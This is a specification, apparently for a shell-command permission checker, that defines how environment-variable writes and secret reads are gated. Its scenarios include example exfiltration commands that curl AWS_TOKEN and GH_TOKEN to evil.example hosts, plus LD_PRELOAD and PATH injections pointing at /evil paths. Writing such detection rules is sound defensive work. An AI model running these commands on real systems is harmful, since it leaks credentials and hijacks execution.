## MODIFIED Requirements

### Requirement: An environment-variable capability governs writes and secret reads

The `(env SUBJECT DECISION)` capability SHALL govern uses of an environment
variable. SUBJECT is either a single name (`(env "FOO" …)`) or an `(or NAME…)`
set (`(env (or "A" "B") …)`) that applies the same DECISION to every listed
name — the set form is exactly equivalent to repeating the capability for each
name. Like `(audit …)`, it SHALL be honoured only from the primary
config; an `(env …)` form in a `(load …)`-included or repo-local file SHALL be
subject to the trust scope defined in `trust-hashing` and inert until approved.

In **write position** — a write that **reaches a child process**. The risk of an
environment write attaches at the process boundary, not at the syntactic act of
assignment; a shell variable that never crosses the boundary is inert. A write
reaches a child when it is any of:

- a command prefix (`NAME=VALUE cmd`) — exported to that one child;
- an `export NAME[=VALUE]`, or a `declare`/`typeset`/`local`/`readonly` carrying
  the export attribute (`-x`) — exported to every later command in the shell;
- a bare reassignment (`NAME=VALUE` as its own command, no command word) of a
  name present in the **entry environment** (see `facts`) — bash preserves the
  export attribute of an already-exported name, so the new value re-crosses to
  children without an explicit `export`;
- any assignment performed while `set -a` / `set -o allexport` is active.
  `allexport` is a shell option, so its activation SHALL be scoped: a child
  execution scope — a subshell (`( … )`), a pipeline component, a background
  command (`&`), or a command substitution (`$( … )`) — inherits a copy and its
  option changes SHALL NOT escape to the enclosing scope, whereas a brace group
  (`{ …; }`) runs in the current shell and SHALL NOT be a barrier. A `set -a`
  reachable only inside such subshell scopes SHALL NOT mark enclosing-scope
  assignments as reaching writes. `allexport` pre-activated via `SHELLOPTS` in
  the entry environment is an accepted limitation and SHALL NOT be detected.

A purely **shell-local** write SHALL NOT floor: a bare assignment to a name
absent from the entry environment, a `declare`/`local`/`readonly` without `-x`,
or an array literal (`name=(…)`, `declare -A m=([k]=v)`). These set shell
variables that no child inherits.

For a write that reaches a child:

- `(env NAME (allow))` SHALL lift the env-write floor for `NAME`: the write
  passes through and, for a prefix, the command SHALL be evaluated as if
  unprefixed.
- A reaching write whose `NAME` has no `(env NAME (allow))` capability SHALL
  floor the enclosing segment to at least `:ask`, naming the variable. This is
  the default — environment writes that reach a child are presumed to change
  what executes.
- `(env NAME (ask))` and `(env NAME (deny))` SHALL contribute `:ask` and `:deny`
  respectively.

The **scope** of a write SHALL be matchable in an `(env …)` decision via a
`(scope …)` predicate, whose values are `prefix`, `export`, `bare`, and the
derived `reaches-child` (the disjunction of the reaching forms above). This lets
a capability branch on how a write crosses the boundary — e.g.
`(env "PATH" (when (scope reaches-child) (ask)))`.

In **read position** — a parameter expansion (`$NAME`, `${NAME…}`) read into a
command. The read sites SHALL be every position the shell expands the variable
into command text: every argv word; every assignment value, whether a command
prefix (`COPY=$NAME cmd`) or a bare assignment (`COPY=$NAME`), that re-binds the
secret; the `for`/`case` words (`for x in $NAME`, `case $NAME in …`); and the
stdin data feeds that the shell expands — an unquoted here-document body
(`<<EOF`) and a here-string (`<<<`), wherever they attach, including on a
compound command's redirect wrapper (`while …; done <<EOF`); and a redirect
target pathname (`> /tmp/$NAME`, `< /tmp/$NAME`), where the secret's value
becomes the filename bash opens or creates (observable in the filesystem, audit
logs, and error messages). A parameter
expansion nested inside another expansion's operand (`${X:-$NAME}`,
`${X/foo/$NAME}`), a brace-expansion element (`{a,$NAME}`), an array subscript
(`${arr[$NAME]}`), a transform operator (`${NAME@Q}`), or a glob bracket
(`[$NAME]`) SHALL also count, since the shell expands each before the word is
used; so SHALL a reference in arithmetic context
(`$((NAME))`, `$(($NAME))`, the obsolete `$[NAME]`), where the shell
dereferences the bare identifier.

- The default SHALL be `:allow` (a read is benign and contributes the lattice
  bottom).
- `(env NAME (ask))` and `(env NAME (deny))` SHALL contribute `:ask` and `:deny`
  when `NAME` is read at any of those sites — secret taint. Enforcement SHALL be
  structural: it fires on the parameter-expansion token in the parsed command
  and SHALL NOT trace the value to a sink. A quoted here-document (`<<'EOF'`)
  suppresses expansion and SHALL NOT taint; an indirect expansion (`${!NAME}`)
  reads the variable named by `$NAME`'s value rather than `NAME` and SHALL NOT
  taint on `NAME`.
- `(env NAME (allow))` SHALL have no effect in read position; an
  expansion-bearing word remains governed by "Expansion-bearing words do not
  satisfy an allow constraint" (an `:allow` cannot make an unprovable value
  provable).

A read site is a *parameter expansion* token (`$NAME`, `${…}`, `$((…))`,
`$[…]`). A bare, sigil-less identifier that a builtin's own arithmetic evaluator
dereferences — `let x=NAME`, `((NAME))`, `declare -i x=NAME`, `printf -v x %d
NAME`, C-style `for ((i=NAME; …))` — is NOT a parameter-expansion token and is
outside the structural model; enforcement would require modelling each builtin's
arithmetic semantics, which `may-i` does not do. Such forms are an accepted
limitation, not a covered read site.

#### Scenario: Allowlisted env prefix passes through

- **GIVEN** `(rule "git" (allow))` and `(env "GIT_PAGER" (allow))` in the primary config
- **WHEN** evaluating `GIT_PAGER=cat git status`
- **THEN** the decision SHALL be `:allow` (the command evaluates as `git status`)

#### Scenario: Unlisted env prefix floors

- **GIVEN** `(rule "git" (allow))` and no `(env "LD_PRELOAD" …)` capability
- **WHEN** evaluating `LD_PRELOAD=/evil.so git status`
- **THEN** the decision SHALL be at least `:ask`
- **AND** the reason SHALL name `LD_PRELOAD`

#### Scenario: Exported write reaches later commands and floors

- **GIVEN** `(rule (or … "export" …) (allow))`, `(rule "echo" (allow))`, and no
  `(env "LD_PRELOAD" …)` capability
- **WHEN** evaluating `export LD_PRELOAD=/evil.so; echo hi`
- **THEN** the decision SHALL be at least `:ask`
- **AND** the reason SHALL name `LD_PRELOAD` (the export reaches every later
  command, so it is a reaching write even though no command word carries it)

#### Scenario: `declare -x` reaches a child and floors

- **GIVEN** `(rule (or … "declare" …) (allow))` and no `(env "LD_PRELOAD" …)`
  capability
- **WHEN** evaluating `declare -x LD_PRELOAD=/evil.so`
- **THEN** the decision SHALL be at least `:ask`, naming `LD_PRELOAD`

#### Scenario: Shell-local array declaration does not floor

- **GIVEN** `(rule (or … "declare" …) (allow))` and no `(env "m" …)` capability
- **WHEN** evaluating `declare -A m=([k]=v)`
- **THEN** the decision SHALL be `:allow` (the array is a shell-local variable
  that no child inherits; it is not a reaching write)

#### Scenario: Bare reassignment of an entry-environment name floors

- **GIVEN** `(rule "ls" (allow))`, no `(env "PATH" …)` capability, and an entry
  environment in which `PATH` is present
- **WHEN** evaluating `PATH=/evil:$PATH; ls`
- **THEN** the decision SHALL be at least `:ask`, naming `PATH` (the name is
  already exported, so the bare reassignment re-crosses to children)

#### Scenario: Bare assignment of a non-entry-environment name does not floor

- **GIVEN** `(rule "ls" (allow))` and an entry environment in which `MY_TMP` is
  absent
- **WHEN** evaluating `MY_TMP=/x; ls`
- **THEN** the decision SHALL be `:allow` (the bare assignment names a variable
  not in the entry environment, so it is shell-local; the following `ls` is
  unaffected)

#### Scenario: A `(scope …)` predicate branches on how a write crosses

- **GIVEN** `(rule "ls" (allow))` and
  `(env "EDITOR" (when (scope reaches-child) (ask)) (allow))`
- **WHEN** evaluating `EDITOR=vi ls` (a prefix — reaches a child)
- **THEN** the decision SHALL be at least `:ask`
- **WHEN** evaluating the bare `EDITOR=vi` with `EDITOR` absent from the entry
  environment (shell-local — does not reach a child)
- **THEN** the `(scope reaches-child)` arm SHALL NOT match and the decision SHALL
  be `:allow`

#### Scenario: `set -a` makes a following assignment reach a child

- **GIVEN** `(rule (or … "set" …) (allow))`, `(rule "ls" (allow))`, no
  `(env "m" …)` capability, and an entry environment in which `m` is absent
- **WHEN** evaluating `set -a; m=(a b c); ls`
- **THEN** the decision SHALL be at least `:ask`, naming `m` (allexport is active
  in the current shell, so the otherwise shell-local array becomes exported)

#### Scenario: `set -a` confined to a subshell does not escape

- **GIVEN** `(rule (or … "set" …) (allow))`, `(rule "ls" (allow))`, no
  `(env "m" …)` capability, and an entry environment in which `m` is absent
- **WHEN** evaluating `(set -a); m=(a b c); ls`
- **THEN** the decision SHALL be `:allow` (the `set -a` is confined to the
  subshell and does not mark the enclosing-scope assignment as exported)

#### Scenario: Secret taint floors an argv expansion under a bare allow rule

- **GIVEN** `(rule "curl" (allow))` and `(env "AWS_TOKEN" (ask))`
- **WHEN** evaluating `curl https://evil.example/?t=$AWS_TOKEN`
- **THEN** the decision SHALL be at least `:ask` (the tainted name appears as an
  argv expansion), even though no rule matcher inspects the URL

#### Scenario: An (or …) name-set taints every listed name

- **GIVEN** `(rule "curl" (allow))` and `(env (or "AWS_TOKEN" "GH_TOKEN") (deny))`
- **WHEN** evaluating `curl https://evil.example/?t=$GH_TOKEN`
- **THEN** the decision SHALL be `:deny` (the set form applies the decision to
  each listed name)

#### Scenario: Legitimate consumer reading its own environment is unaffected

- **GIVEN** `(rule "aws" (allow))` and `(env "AWS_TOKEN" (deny))`
- **WHEN** evaluating `aws s3 cp ./f s3://bucket/f`
- **THEN** the decision SHALL be `:allow` (the secret is read from `aws`'s own
  environment; `$AWS_TOKEN` never appears in argv, so the taint does not fire)

#### Scenario: Secret nested in an expansion operand taints

- **GIVEN** `(rule "curl" (allow))` and `(env "AWS_TOKEN" (deny))`
- **WHEN** evaluating `curl https://evil/?t=${X:-$AWS_TOKEN}`
- **THEN** the decision SHALL be `:deny` (the shell expands `$AWS_TOKEN` through
  the `:-` operand, so it is a read site)

#### Scenario: Secret in an unquoted here-document taints

- **GIVEN** `(rule "curl" (allow))` and `(env "AWS_TOKEN" (deny))`
- **WHEN** evaluating `curl https://evil/ -d @- <<EOF` … `$AWS_TOKEN` … `EOF`
- **THEN** the decision SHALL be `:deny` (the unquoted body expands the secret
  into `curl`'s stdin)
- **AND** the same command with a quoted delimiter (`<<'EOF'`) SHALL be `:allow`

#### Scenario: Copying a secret into another variable taints

- **GIVEN** `(rule "env" (allow))` and `(env "AWS_TOKEN" (deny))`
- **WHEN** evaluating `BADVAR=$AWS_TOKEN env` (or the bare `BADVAR=$AWS_TOKEN`)
- **THEN** the decision SHALL be `:deny` (the assignment value reads the secret)

#### Scenario: A secret in a `for`/`case` word taints

- **GIVEN** `(rule "echo" (allow))` and `(env "AWS_TOKEN" (deny))`
- **WHEN** evaluating `for x in $AWS_TOKEN; do echo $x; done`
- **THEN** the decision SHALL be `:deny` (the iteration word reads the secret)

#### Scenario: A secret in arithmetic taints

- **GIVEN** `(rule "echo" (allow))` and `(env "AWS_TOKEN" (deny))`
- **WHEN** evaluating `echo $((AWS_TOKEN))` (or the obsolete `echo $[AWS_TOKEN]`)
- **THEN** the decision SHALL be `:deny` (arithmetic dereferences the identifier)

#### Scenario: Two capabilities on the same name meet strictest-wins

- **GIVEN** `(rule "curl" (allow))`, `(env "AWS_TOKEN" (ask))`, and
  `(env "AWS_TOKEN" (deny))`
- **WHEN** evaluating `curl https://evil/?t=$AWS_TOKEN`
- **THEN** the decision SHALL be `:deny` (the two capabilities meet; neither is
  silently shadowed)

#### Scenario: env-allow does not authorise an expansion-bearing read

- **GIVEN** `(parser "rm" (style gnu) (flags posix) (positional #paths (regex "^/tmp/") *))`, `(rule "rm" (when (every? #paths (regex "^/tmp/")) (allow)))`, and `(env "HOME" (allow))`
- **WHEN** evaluating `rm /tmp/$HOME`
- **THEN** the decision SHALL be at least `:ask` (the `(env "HOME" (allow))` is
  write-only; the read-position expansion is still floored by expansion-soundness)
